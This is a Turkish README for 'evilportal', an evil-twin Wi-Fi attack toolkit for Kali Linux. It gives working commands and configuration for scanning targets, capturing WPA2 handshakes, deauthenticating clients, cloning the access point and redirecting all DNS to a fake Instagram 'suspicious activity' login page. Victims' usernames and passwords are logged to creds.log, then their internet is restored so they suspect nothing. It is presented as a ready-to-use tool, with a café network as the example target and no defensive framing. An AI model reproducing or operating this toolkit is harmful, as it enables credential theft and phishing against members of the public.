# evilportal

Kali Linux üzerinde çalışan evil-twin + captive-portal sistemi:

**deauth → aynı SSID'li sahte AP → wildcard DNS → sahte doğrulama sayfası → credential capture → MAC whitelist ile gerçek internet**

---

## Gereksinimler

| Bileşen | Not |
|---|---|
| Kali Linux | root |
| Monitor mode destekli adaptör | deauth için |
| İkinci adaptör | AP için (önerilen) |
| `hostapd`, `dnsmasq` | `apt install hostapd dnsmasq` |
| `aircrack-ng` | `apt install aircrack-ng` — handshake yakalama/doğrulama için |
| `ipset`, `iptables` | genelde kurulu |
| `flask` | `sudo apt install python3-flask` (veya `pip3 install flask --break-system-packages`) |
| `conntrack` | `sudo apt install conntrack` — doğrulama sonrası DNS geçişi için (önerilen) |

---

## Hızlı başlangıç

### A) GUI ile (önerilen)

```bash
cd evilportal
chmod +x setup.sh deauth.sh scan.sh autopwn.sh
sudo python3 gui.py
```

Tarayıcıda `http://127.0.0.1:8099` aç:

1. **Arayüz** — monitor kartı, AP kartı, uplink
2. **Hedef** — “Tara” ile ağları listele, seç; SSID/BSSID/kanal otomatik dolar
3. **Yakala** — WPA2 ise handshake yakala, capture/ klasörüne .cap olarak kaydet
4. **Başlat** — canlı log, başlat/durdur
5. **Kayıtlar** — yakalanan bilgiler, otomatik yenilenir

“Portalı önizle” butonu seçili sahte sayfayı yeni sekmede gösterir.

GUI yalnızca `127.0.0.1`'i dinler. Kali'yi uzaktan yönetiyorsan SSH tüneli aç:

```bash
# kendi makinende
ssh -L 8099:127.0.0.1:8099 kali@hedef-ip
# sonra tarayıcıda
http://127.0.0.1:8099
```

### B) Terminal ile

```bash
cd evilportal
chmod +x setup.sh deauth.sh scan.sh autopwn.sh

# 1) Hedefi bul
sudo ./scan.sh wlan0
#    Çıktıdaki BSSID / CH / ESSID değerlerini not al

# 1b) WPA2 ise handshake yakala (capture/handshake_<BSSID>.cap'e yazar)
sudo ./autopwn.sh AA:BB:CC:DD:EE:FF 6 KafeWiFi
#    PSK'yi biliyorsan config.sh'de WPA_PASS'e yaz

# 2) config.sh'i düzenle
nano config.sh
#    TARGET_SSID, TARGET_BSSID, CHANNEL, WPA_PASS, MON_IF, AP_IF

# 3) Çalıştır
sudo ./setup.sh

# 4) Yakalananları izle (ayrı terminal)
python3 show.py -f

# 5) Durdur
Ctrl+C
```

`setup.sh` çıkışta otomatik temizlik yapar: iptables, ipset, hostapd, dnsmasq kapatılır, NetworkManager geri açılır.

Başlatmadan önce hiçbir şeye dokunmadan doğrulama:

```bash
sudo ./setup.sh --check
```

Bağımlılıkları, arayüzleri, BSSID/kanal biçimini ve WPA2 parola uzunluğunu (8–63)
kontrol eder; sorun varsa net hata verir, yoksa özet basıp çıkar.

---

## Ayar dosyası

```bash
# --- Arayüzler ---
MON_IF="wlan0"        # monitor (deauth)
AP_IF="wlan1"         # sahte AP
UPLINK_IF=""          # boş = otomatik bul
SINGLE_ADAPTER=0      # 1 = tek adaptör
MON_VIF="evilmon"     # tek adaptör modunda sanal monitor vif

# --- Hedef ---
TARGET_SSID="KafeWiFi"
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
CHANNEL=6
WPA_PASS=""           # hedef WPA2 ise parolası

# --- Ağ ---
GATEWAY_IP="10.0.0.1"
PORTAL_PORT=80
AUTH_DNS_PORT=5399    # yetkili istemciler için yerel çözümleyici
SHARE_INTERNET=1

# --- İçerik ---
PORTAL_TEMPLATE="instagram"   # instagram | verify
BRAND="Hesap Güvenliği Merkezi"
SUCCESS_URL="https://www.google.com"

# --- Handshake yakalama ---
CAPTURE_TIMEOUT="60"
```

---

## Kritik nokta: hedefin güvenlik tipi

Bu, sistemin çalışıp çalışmayacağını belirleyen tek şey:

| Hedef ağ | Yöntem | Sonuç |
|---|---|---|
| **Açık (open)** | `WPA_PASS` boş | İstemciler otomatik bağlanır ✅ |
| **WPA2-PSK, parola biliniyor** | `WPA_PASS` dolu | İstemciler otomatik bağlanır ✅ |
| **WPA2-PSK, parola bilinmiyor** | 3. adım: handshake yakala, PSK'yi başka yolla bul | PSK elde edilirse ✅, edilemezse ❌ |
| **WPA3 / 802.1X** | — | Deauth PMF ile engellenir ❌ |

Kritik nokta: WPA2 hedefte sahte AP'nin istemcileri **otomatik** çekmesi için gerçek
PSK'yi bilmek zorundasın. İstemci kayıtlı profiliyle 4-way handshake bekler; sen PSK'ya
sahip değilsen handshake tamamlanmaz ve cihaz bağlanmaz. `autopwn.sh` bu handshake'i
yakalayıp `.cap` olarak kaydeder; PSK'yi bulmak (örn. kendi bilgine dayanarak veya
ayrı bir offline araçla) ve `WPA_PASS`'e yazmak sana kalır.

### Neden portal açılmıyor?

Portal, bağlantının **son** adımında çalışır:

```
1. Association        kablosuz çerçeve alışverişi
2. Authentication     WPA2 4-way handshake (PSK gerekir)
3. DHCP               istemci IP alır
4. DNS + HTTP         captive portal açılır
```

Senin sahte AP açık (veya farklı parolalı) ise istemci **2. adımda** durur: kayıtlı
profilinde bu SSID WPA2-PSK olarak kayıtlı, senin AP'nde 4-way handshake tamamlanamaz,
IP alınamaz, dolayısıyla HTTP isteği hiç atılmaz ve portal açılmaz. Telefon sadece
"kimlik doğrulama hatası" gösterip gerçek AP'ye dönmeye çalışır.

Yani handshake yakalamak ≠ parolayı bilmek. Aynı SSID'yi açık yayınlamak da işe
yaramaz; istemci güvenlik tipi değiştiği için otomatik bağlanmaz. Tek doğru yol:
**PSK'yi öğren → `WPA_PASS`'e yaz → aynı PSK ile twin**.

---

## Handshake yakalama — `autopwn.sh`

```
monitor mode + kanal kilidi
        ↓
airodump-ng (hedef BSSID, pcap)  +  aireplay-ng deauth döngüsü
        ↓
4-way handshake yakalanana kadar bekle (CAPTURE_TIMEOUT)
        ↓
capture/handshake_<BSSID>.cap olarak kaydedilir
        ↓
PSK'yi öğren (biliyorsan / ayrı bir offline araçla) → WPA_PASS'e yaz
        ↓
4. adımda sahte AP bu PSK ile açılır → istemciler otomatik bağlanır
        ↓
captive portal → Instagram sayfası
```

Terminalden:

```bash
sudo ./autopwn.sh
# veya
sudo ./autopwn.sh AA:BB:CC:DD:EE:FF 6 KafeWiFi wlan0 90
```

Sınırlar:

- **Handshake için hedefe bağlı aktif bir istemci gerekir.** Kimse bağlı değilse
  deauth handshake üretmez.
- WPA3-SAE'de pasif handshake yakalanabilir ama bu akışla kırılamaz; 802.11w PMF
  deauth'u engeller.
- Bu script PSK bulmaz — sadece `.cap` üretir. PSK'yi `WPA_PASS`'e yazmak sana kalır.

---

## Akış

```
1. airmon-ng check kill          → NetworkManager susturulur
2. wlan0 → monitor, kanal kilit  → deauth hazır
3. wlan1 → 10.0.0.1, hostapd     → sahte AP yayında (aynı SSID + BSSID)
4. dnsmasq :53                   → DHCP + tüm alan adları 10.0.0.1
5. dnsmasq :AUTH_DNS_PORT        → yetkili istemciler için gerçek çözümleme
6. iptables DNAT :80 → portal    → HTTP portalda biter
7. iptables DNAT :53              → yetkisiz → wildcard, yetkili → gerçek
8. aireplay-ng --deauth döngüsü  → istemciler gerçek AP'den düşer
9. İstemci twin'e bağlanır       → OS probe → portal açılır
10. Form POST → creds.log + ipset + conntrack flush → internet açılır
```

---

## Neden iki adaptör?

Tek radyo aynı anda hem deauth atıp hem AP yayınlayamaz. Gerçek AP hâlâ yayında olduğu için istemciler sürekli gerçek AP'ye dönmeye çalışır; deauth döngüsü bu yüzden şart. Deauth için bir adaptör, AP için başka bir adaptör gerekir.

`SINGLE_ADAPTER=1` ile sanal `evilmon` vif oluşturulur. Bazı yongalar (ath9k, mt76) bunu kaldırır, bazıları kaldırmaz. Kaldırıyorsa deauth verimi düşer.

---

## Portal davranışı

İki ayrı DNS yolu var:

- **Yetkisiz istemci:** DNS isteği (hangi sunucuya giderse gitsin) iptables ile
  `10.0.0.1:53`'e yönlendirilir. dnsmasq burada her alan adını `10.0.0.1` olarak
  yanıtlar, HTTP de portala düşer.
- **Yetkili istemci:** MAC `ipset portal_auth`'a eklendikten sonra DNS isteği
  `10.0.0.1:AUTH_DNS_PORT`'a yönlendirilir; bu ikinci dnsmasq gerçek yukarı akışla
  çözümleme yapar. Böylece doğrulama sonrası internet **DNS dahil** çalışır — 
  ilk kurulumda tüm alan adları sonsuza kadar `10.0.0.1`'e dönmüyor.

OS probe endpoint'leri (`/generate_204`, `/hotspot-detect.html`, `/connecttest.txt` …)
302 döner → işletim sistemi captive portal algılar ve kendi mini tarayıcısını açar.

HTTPS (443) doğrulanmamış istemciler için `tcp-reset` ile reddedilir. Bu yüzden
kullanıcı portal dışına çıkamaz; tüm gezinme portalda kalır.

Form gönderildiğinde:

```json
{"ts":"2026-11-20 14:03:11","ip":"10.0.0.42","mac":"aa:bb:cc:dd:ee:ff",
 "username":"kisi@mail.com","password":"...","ua":"Mozilla/5.0 ..."}
```

satırı `capture/creds.log`'a yazılır, MAC `ipset portal_auth`'a eklenir, istemcinin
eski conntrack kayıtları silinir (`conntrack -D -s <ip>`), `thanks.html` gösterilir ve
2 saniye sonra `SUCCESS_URL`'e yönlendirilir. Bu noktadan sonra istemcinin interneti
gerçekten açılır — kurban "doğruladım, düzeldi" hisseder.

---

## Sayfayı özelleştirme

`PORTAL_TEMPLATE` ile portal sayfası seçilir:

| Değer | Sayfa |
|---|---|
| `instagram` | Instagram görünümlü “şüpheli aktivite, 24 saat içinde kapatılacak” |
| `verify` | Genel “hesap doğrulama” sayfası |

`portal/templates/instagram.html` — logo, başlık, uyarı metni, form alanları.
`portal/templates/verify.html` — genel varyant.
`portal/templates/thanks.html` — doğrulama sonrası ekran.
`config.sh` içindeki `SUCCESS_URL` — iki template'te de kullanılır.

Form alanlarını değiştirirsen `portal/app.py` içindeki `request.form.get(...)`
anahtarlarını da güncelle.

---

## Kayıtları okuma

```bash
python3 show.py          # bir kere
python3 show.py -f       # canlı takip
```

---

## Sorun giderme

| Belirti | Sebep / çözüm |
|---|---|
| `hostapd başlatılamadı` | Adaptör AP mode desteklemiyor veya `AP_IF` yanlış. `logs/hostapd.log` |
| `port 80 zaten dinleniyor` | Başka bir servis 80'i kullanıyor: `sudo ss -ltnp 'sport = :80'` |
| `dnsmasq (yetkili DNS) başlatılamadı` | `AUTH_DNS_PORT` dolu — config.sh'de değiştir |
| `kanal ayarlanamadı` | Kart o kanalı/bandı desteklemiyor veya reg domain kapalı |
| Portal açılmıyor | `dnsmasq` çalışıyor mu, `iptables -t nat -L EP_NAT -n -v` |
| İstemci bağlanmıyor | Hedef WPA2 ve `WPA_PASS` boş — yukarıdaki tablo |
| Sahte AP'ye bağlanıyor ama portal açılmıyor | İstemci association yapamıyor: PSK bilinmiyor. Önce `autopwn.sh` ile handshake yakala, PSK'yi öğrenip `WPA_PASS`'e yaz |
| Doğruladım ama site açılmıyor | `conntrack` kurulu değilse eski DNS akışı ~30 sn takılı kalır: `apt install conntrack` |
| Handshake yakalanmıyor | Hedefe bağlı istemci yok, kanal yanlış, ya da PMF aktif |
| Deauth işe yaramıyor | 802.11w (PMF) aktif, ya da yanlış kanal/BSSID |
| Tek adaptörde AP düşüyor | Yongaset uyumsuz — ikinci adaptör kullan |
| Bağlandım ama portal hiç açılmadı, internet zaten çalışıyor | Muhtemelen sahte AP'ye değil **gerçek** hedefe bağlandın (aynı SSID iki yerden yayınlanıyor). İstemci cihazda bağlı ağın BSSID'sini kontrol et (iOS: ağın yanındaki ⓘ, Android: Wi-Fi detayları) ve `TARGET_BSSID` ile karşılaştır — farklıysa gerçek AP'ye bağlısın, deauth onu düşürmemiş demektir |
| İnternet gelmiyor | `UPLINK_IF` yanlış veya `ip_forward` kapalı |
| `wifi rfkill ile kapatılmış` | `sudo rfkill unblock wifi` |
| `ipset` bulunamadı | `apt install ipset` |

---

## Dosya yapısı

```
evilportal/
├── config.sh                 # tüm ayarlar
├── lib.sh                    # ortak monitor/arayüz yardımcıları
├── setup.sh                  # ana orkestrasyon
├── gui.py                    # adım adım yerel web GUI (127.0.0.1:8099)
├── autopwn.sh                # handshake yakala (.cap)
├── deauth.sh                 # sürekli deauth döngüsü
├── scan.sh                   # hedef keşfi
├── show.py                   # yakalananları göster
├── portal/
│   ├── app.py                # Flask portal + capture + ipset
│   └── templates/
│       ├── instagram.html    # Instagram — şüpheli aktivite
│       ├── verify.html       # genel doğrulama
│       └── thanks.html       # doğrulama sonrası
├── capture/creds.log         # yakalananlar (runtime)
├── logs/                     # hostapd/dnsmasq/portal logları (runtime)
└── run/                      # geçici config + pid dosyaları (runtime)
```

---

## Sınırlar

- **WPA3 / 802.1X** hedeflerde deauth çalışmaz (PMF), twin bağlanmaz.
- **HTTPS içeriği** deşifre edilmez — portal sadece HTTP üzerinde çalışır, form verisi düz metin gider çünkü sayfa senin sunucundan geliyor.
- **iOS/macOS** captive portal WebView'i (.mobileconfig kurulumu) engeller; bu sistem sertifika yükletmez, kimlik avına dayanır.
- Kurban "Use without internet" / "Bağlantıyı kes" derse portal atlanır.
